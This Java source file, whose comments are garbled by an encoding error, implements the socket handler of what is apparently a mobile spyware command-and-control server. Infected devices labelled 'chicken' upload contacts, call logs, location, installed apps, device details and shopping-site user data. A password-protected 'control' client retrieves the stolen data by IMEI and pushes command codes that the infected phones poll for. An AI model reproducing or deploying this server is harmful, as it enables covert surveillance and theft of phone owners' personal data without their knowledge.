package com.lu.java;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

import net.sf.json.JSONException;
import net.sf.json.JSONObject;

import com.lu.info.*;
/**
 * socket�����̴߳���
 * @author LU
 *
 */
public class SocketThread extends Thread{
    private Socket socket;

    public SocketThread(Socket socket){
        this.socket = socket;
    }

	public void run(){

        try{
        	 InputStream inputStream=socket.getInputStream();//�õ�һ�������������տͻ��˴��ݵ���Ϣ
             InputStreamReader inputStreamReader=new InputStreamReader(inputStream,"UTF-8");//���Ч�ʣ����ֽ���תΪ�ַ���
             BufferedReader bufferedReader=new BufferedReader(inputStreamReader);//���뻺����
             String temp=null;
             String info="";
             while((temp=bufferedReader.readLine())!=null){
                 info+=temp;
             }
             System.out.println("----------------------");
             System.out.println("�յ����ӣ�"+socket.getInetAddress().getHostAddress());
             //System.out.println("�ͻ���˵��\n"+info);
             
             JSONObject obj = JSONObject.fromObject(info);
             String returnData = "success";
             
             if(obj.getString("ID").equals("chicken")){
            	 System.out.println("��Ⱦ������");
            	 if(obj.getString("datatype").equals("appInstalled")){
            		 /**�����Ѱ�װӦ��*/
            		 MsgTool.appInstalledhandle(info);
            	 }else if(obj.getString("datatype").equals("deviceInfo")){
            		 /**�����豸��Ϣ*/
            		 MsgTool.deviceHandle(info);
            	 }else if(obj.getString("datatype").equals("phoneContacts")){
            		 /**����ͨѶ¼*/
            		 MsgTool.contactshandel(info);
            	 }else if(obj.getString("datatype").equals("all")){
            		 /**����ȫ����Ϣ*/
            		 MsgTool.msgHandle(info);
            	 }else if(obj.getString("datatype").equals("location")){
            		 /**����λ��*/
            		 MsgTool.locationHandle(info);
            	 }else if(obj.getString("datatype").equals("callLog")){
            		 /**����ͨѶ��¼*/
            		 MsgTool.callLogHandle(info);
            	 }else if(obj.getString("datatype").equals("shopCarUrl")){
            		 /**���������ؼ��û���Ϣ*/
            		 ShopURL.urlConfrim(info);
            	 }else if(obj.getString("datatype").equals("requestCode")){
            		 /**����ָ��*/
            		 System.out.println("��Ⱦ������ָ���룬��ǰָ���룺"+CodeFlag.getCOMMEND_CODE());
            		 returnData = CodeFlag.getCOMMEND_CODE();
            	 }else{
            		 System.out.println("δ֪���ݸ�ʽ");
            		 returnData = "";
            	 }
             }else if(obj.getString("ID").equals("control")){
            	 System.out.println("�ƶ����ƶ�����");
            	 if(obj.getString("datatype").equals("password")){
            		 /**���ƶ˵�¼*/
            		 returnData = MsgTool.passwordVerify(obj.getString("password"));
            	 }else if(obj.getString("datatype").equals("normaldata")){
            		 /**���ƶ���������*/
            		 returnData = MsgTool.outputData(obj.getString("IMEI"));
            	 }else if(obj.getString("datatype").equals("shopusers")){
            		 /**���ƶ����������ؼ�����*/
            		 returnData = ShopURL.outUserData();
            	 }else if(obj.getString("datatype").equals("upCode")){
            		 /**���ƶ˸���ָ��*/
            		 CodeFlag.setCOMMEND_CODE(obj.getString("code"));
            		 System.out.println("ָ������³ɹ�����ǰָ�"+CodeFlag.getCOMMEND_CODE());
            	 }else if(obj.getString("datatype").equals("requestIMEI")){
            		 /**���ƶ�����IMEI�б�*/
            		 returnData = MsgTool.returnIMEI();
            	 }
            		 else{
            		 System.out.println("δ֪���ݸ�ʽ");
                	 returnData = "";
            	 }
             }else{
            	 System.out.println("δ֪���ݸ�ʽ");
            	 returnData = "";
             }
            
            OutputStream outputStream = socket.getOutputStream();
            PrintWriter printWriter = new PrintWriter(outputStream);
            printWriter.print(returnData);
            printWriter.flush();
            socket.shutdownOutput();// �ر������

            printWriter.close();
            outputStream.close();
            bufferedReader.close();
            inputStream.close();
            socket.close();
        }catch (IOException e) {
            e.printStackTrace();
        }catch (JSONException e){
        	e.printStackTrace();
        }
    }
}